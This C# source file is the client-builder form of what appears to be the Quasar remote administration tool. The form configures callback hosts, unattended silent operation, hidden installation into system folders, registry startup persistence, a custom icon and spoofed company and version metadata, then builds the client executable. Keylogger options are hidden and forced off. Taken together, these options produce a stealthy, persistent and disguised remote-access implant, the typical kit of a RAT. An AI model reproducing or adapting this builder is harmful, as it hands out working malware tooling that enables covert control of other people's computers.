using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Server.Build;
using Quasar.Server.Models;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmBuilder : Form
    {
        private bool _profileLoaded;
        private bool _changed;
        private readonly BindingList<Host> _hosts = new BindingList<Host>();
        private readonly HostsConverter _hostsConverter = new HostsConverter();

        public FrmBuilder()
        {
            InitializeComponent();
        }

        private void LoadProfile(string profileName)
        {
            var profile = new BuilderProfile(profileName);

            _hosts.Clear();
            foreach (var host in _hostsConverter.RawHostsToList(profile.Hosts))
                _hosts.Add(host);

            txtTag.Text = profile.Tag;
            numericUpDownDelay.Value = profile.Delay;
            txtMutex.Text = profile.Mutex;
            chkUnattendedMode.Checked = profile.UnattendedMode;
            chkInstall.Checked = profile.InstallClient;
            txtInstallName.Text = profile.InstallName;
            GetInstallPath(profile.InstallPath).Checked = true;
            txtInstallSubDirectory.Text = profile.InstallSub;
            chkHide.Checked = profile.HideFile;
            chkHideSubDirectory.Checked = profile.HideSubDirectory;
            chkStartup.Checked = profile.AddStartup;
            txtRegistryKeyName.Text = profile.RegistryName;
            chkChangeIcon.Checked = profile.ChangeIcon;
            txtIconPath.Text = profile.IconPath;
            chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
            chkKeylogger.Checked = profile.Keylogger;
            txtLogDirectoryName.Text = profile.LogDirectoryName;
            chkHideLogDirectory.Checked = profile.HideLogDirectory;
            txtProductName.Text = profile.ProductName;
            txtDescription.Text = profile.Description;
            txtCompanyName.Text = profile.CompanyName;
            txtCopyright.Text = profile.Copyright;
            txtTrademarks.Text = profile.Trademarks;
            txtOriginalFilename.Text = profile.OriginalFilename;
            txtProductVersion.Text = profile.ProductVersion;
            txtFileVersion.Text = profile.FileVersion;

            _profileLoaded = true;
        }

        private void SaveProfile(string profileName)
        {
            var profile = new BuilderProfile(profileName);

            profile.Tag = txtTag.Text;
            profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
            profile.Delay = (int) numericUpDownDelay.Value;
            profile.Mutex = txtMutex.Text;
            profile.UnattendedMode = chkUnattendedMode.Checked;
            profile.InstallClient = chkInstall.Checked;
            profile.InstallName = txtInstallName.Text;
            profile.InstallPath = GetInstallPath();
            profile.InstallSub = txtInstallSubDirectory.Text;
            profile.HideFile = chkHide.Checked;
            profile.HideSubDirectory = chkHideSubDirectory.Checked;
            profile.AddStartup = chkStartup.Checked;
            profile.RegistryName = txtRegistryKeyName.Text;
            profile.ChangeIcon = chkChangeIcon.Checked;
            profile.IconPath = txtIconPath.Text;
            profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
            profile.Keylogger = false; // Keylogger functionality has been permanently disabled
            profile.LogDirectoryName = txtLogDirectoryName.Text;
            profile.HideLogDirectory = chkHideLogDirectory.Checked;
            profile.ProductName = txtProductName.Text;
            profile.Description = txtDescription.Text;
            profile.CompanyName = txtCompanyName.Text;
            profile.Copyright = txtCopyright.Text;
            profile.Trademarks = txtTrademarks.Text;
            profile.OriginalFilename = txtOriginalFilename.Text;
            profile.ProductVersion = txtProductVersion.Text;
            profile.FileVersion = txtFileVersion.Text;
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            // Hide keylogger functionality - feature has been completely removed
            chkKeylogger.Visible = false;
            lblLogDirectory.Visible = false;
            txtLogDirectoryName.Visible = false;
            chkHideLogDirectory.Visible = false;
            line10.Visible = false;
            label14.Visible = false;

            lstHosts.DataSource = new BindingSource(_hosts, null);
            LoadProfile("Default");

            numericUpDownPort.Value = Settings.ListenPort;

            UpdateInstallationControlStates();
            UpdateStartupControlStates();
            UpdateAssemblyControlStates();
            UpdateIconControlStates();
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed &&
                MessageBox.Show(this, "Do you want to save your current settings?", "Changes detected",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Default");
            }
        }

        private void btnAddHost_Click(object sender, EventArgs e)
        {
            if (txtHost.Text.Length < 1) return;

            HasChanged();

            var host = txtHost.Text;
            ushort port = (ushort) numericUpDownPort.Value;

            _hosts.Add(new Host {Hostname = host, Port = port});
            txtHost.Text = "";
        }

        #region "Context Menu"
        private void removeHostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            List<string> selectedHosts = (from object arr in lstHosts.SelectedItems select arr.ToString()).ToList();

            foreach (var item in selectedHosts)
            {
                foreach (var host in _hosts)
                {
                    if (item == host.ToString())
                    {
                        _hosts.Remove(host);
                        break;
                    }
                }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            _hosts.Clear();
        }
        #endregion

        #region "Misc"
        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void txtLogDirectoryName_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            HasChanged();

            txtMutex.Text = Guid.NewGuid().ToString();
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateInstallationControlStates();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateStartupControlStates();
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateAssemblyControlStates();
        }

        private void chkKeylogger_CheckedChanged(object sender, EventArgs e)
        {
            // Keylogger functionality permanently disabled
            HasChanged();
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons *.ico|*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = ofd.FileName;
                    iconPreview.Image = Bitmap.FromHicon(new Icon(ofd.FileName, new Size(64, 64)).Handle);
                }
            }
        }

        private void chkChangeIcon_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateIconControlStates();
        }
        #endregion

        private bool CheckForEmptyInput()
        {
            return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && // General Settings
                 _hosts.Count > 0  && // Connection
                 (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallName.Text))) && // Installation
                 (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
        }

        private BuildOptions GetBuildOptions()
        {
            BuildOptions options = new BuildOptions();
            if (!CheckForEmptyInput())
            {
                throw new Exception("Please fill out all required fields!");
            }

            options.Tag = txtTag.Text;
            options.Mutex = txtMutex.Text;
            options.UnattendedMode = chkUnattendedMode.Checked;
            options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
            options.Delay = (int) numericUpDownDelay.Value;
            options.IconPath = txtIconPath.Text;
            options.Version = Application.ProductVersion;
            options.InstallPath = GetInstallPath();
            options.InstallSub = txtInstallSubDirectory.Text;
            options.InstallName = txtInstallName.Text + ".exe";
            options.StartupName = txtRegistryKeyName.Text;
            options.Install = chkInstall.Checked;
            options.Startup = chkStartup.Checked;
            options.HideFile = chkHide.Checked;
            options.HideInstallSubdirectory = chkHideSubDirectory.Checked;
            options.Keylogger = false; // Keylogger functionality permanently disabled
            options.LogDirectoryName = txtLogDirectoryName.Text;
            options.HideLogDirectory = chkHideLogDirectory.Checked;

            if (!File.Exists("client.bin"))
            {
                throw new Exception("Could not locate \"client.bin\" file. It should be in the same directory as Quasar.");
            }

            if (options.RawHosts.Length < 2)
            {
                throw new Exception("Please enter a valid host to connect to.");
            }

            if (chkChangeIcon.Checked)
            {
                if (string.IsNullOrWhiteSpace(options.IconPath) || !File.Exists(options.IconPath))
                {
                    throw new Exception("Please choose a valid icon path.");
                }
            }
            else
                options.IconPath = string.Empty;

            if (chkChangeAsmInfo.Checked)
            {
                if (!IsValidVersionNumber(txtProductVersion.Text))
                {
                    throw new Exception("Please enter a valid product version number!\nExample: 1.2.3.4");
                }

                if (!IsValidVersionNumber(txtFileVersion.Text))
                {
                    throw new Exception("Please enter a valid file version number!\nExample: 1.2.3.4");
                }

                options.AssemblyInformation = new string[8];
                options.AssemblyInformation[0] = txtProductName.Text;
                options.AssemblyInformation[1] = txtDescription.Text;
                options.AssemblyInformation[2] = txtCompanyName.Text;
                options.AssemblyInformation[3] = txtCopyright.Text;
                options.AssemblyInformation[4] = txtTrademarks.Text;
                options.AssemblyInformation[5] = txtOriginalFilename.Text;
                options.AssemblyInformation[6] = txtProductVersion.Text;
                options.AssemblyInformation[7] = txtFileVersion.Text;
            }

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "Save Client as";
                sfd.Filter = "Executables *.exe|*.exe";
                sfd.RestoreDirectory = true;
                sfd.FileName = "Client-built.exe";
                if (sfd.ShowDialog() != DialogResult.OK)
                {
                    throw new Exception("Please choose a valid output path.");
                }
                options.OutputPath = sfd.FileName;
            }

            if (string.IsNullOrEmpty(options.OutputPath))
            {
                throw new Exception("Please choose a valid output path.");
            }

            return options;
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            BuildOptions options;
            try
            {
                options = GetBuildOptions();
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SetBuildState(false);
            
            Thread t = new Thread(BuildClient);
            t.Start(options);
        }

        private void SetBuildState(bool state)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    btnBuild.Text = (state) ? "Build" : "Building...";
                    btnBuild.Enabled = state;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void BuildClient(object o)
        {
            try
            {
                BuildOptions options = (BuildOptions) o;

                var builder = new ClientBuilder(options, "client.bin");

                builder.Build();

                try
                {
                    this.Invoke((MethodInvoker) delegate
                    {
                        MessageBox.Show(this,
                            $"Successfully built client! Saved to:\\{options.OutputPath}",
                            "Build Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    });
                }
                catch (Exception)
                {
                }
            }
            catch (Exception ex)
            {
                try
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        MessageBox.Show(this,
                            $"An error occurred!\n\nError Message: {ex.Message}\nStack Trace:\n{ex.StackTrace}", "Build failed",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    });
                }
                catch (Exception)
                {
                }
            }
            SetBuildState(true);
        }

        private void RefreshPreviewPath()
        {
            string path = string.Empty;
            if (rbAppdata.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            txtInstallSubDirectory.Text), txtInstallName.Text);
            else if (rbProgramFiles.Checked)
                path =
                    Path.Combine(
                        Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), txtInstallSubDirectory.Text), txtInstallName.Text);
            else if (rbSystem.Checked)
                path =
                    Path.Combine(
                        Path.Combine(
                            Environment.GetFolderPath(Environment.SpecialFolder.System), txtInstallSubDirectory.Text), txtInstallName.Text);

            this.Invoke((MethodInvoker)delegate { txtPreviewPath.Text = path + ".exe"; });
        }

        private bool IsValidVersionNumber(string input)
        {
            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
            return match.Success;
        }

        private short GetInstallPath()
        {
            if (rbAppdata.Checked) return 1;
            if (rbProgramFiles.Checked) return 2;
            if (rbSystem.Checked) return 3;
            throw new ArgumentException("InstallPath");
        }

        private RadioButton GetInstallPath(short installPath)
        {
            switch (installPath)
            {
                case 1:
                    return rbAppdata;
                case 2:
                    return rbProgramFiles;
                case 3:
                    return rbSystem;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }

        private void UpdateAssemblyControlStates()
        {
            txtProductName.Enabled = chkChangeAsmInfo.Checked;
            txtDescription.Enabled = chkChangeAsmInfo.Checked;
            txtCompanyName.Enabled = chkChangeAsmInfo.Checked;
            txtCopyright.Enabled = chkChangeAsmInfo.Checked;
            txtTrademarks.Enabled = chkChangeAsmInfo.Checked;
            txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
            txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
            txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
        }

        private void UpdateIconControlStates()
        {
            txtIconPath.Enabled = chkChangeIcon.Checked;
            btnBrowseIcon.Enabled = chkChangeIcon.Checked;
        }

        private void UpdateStartupControlStates()
        {
            txtRegistryKeyName.Enabled = chkStartup.Checked;
        }

        private void UpdateInstallationControlStates()
        {
            txtInstallName.Enabled = chkInstall.Checked;
            rbAppdata.Enabled = chkInstall.Checked;
            rbProgramFiles.Enabled = chkInstall.Checked;
            rbSystem.Enabled = chkInstall.Checked;
            txtInstallSubDirectory.Enabled = chkInstall.Checked;
            chkHide.Enabled = chkInstall.Checked;
            chkHideSubDirectory.Enabled = chkInstall.Checked;
        }

        private void UpdateKeyloggerControlStates()
        {
            // Keylogger functionality permanently disabled
            txtLogDirectoryName.Enabled = false;
            chkHideLogDirectory.Enabled = false;
        }

        private void HasChanged()
        {
            if (!_changed && _profileLoaded)
                _changed = true;
        }

        /// <summary>
        /// Handles a basic change in setting.
        /// </summary>
        private void HasChangedSetting(object sender, EventArgs e)
        {
            HasChanged();
        }

        /// <summary>
        /// Handles a basic change in setting, also refreshing the example file path.
        /// </summary>
        private void HasChangedSettingAndFilePath(object sender, EventArgs e)
        {
            HasChanged();

            RefreshPreviewPath();
        }
    }
}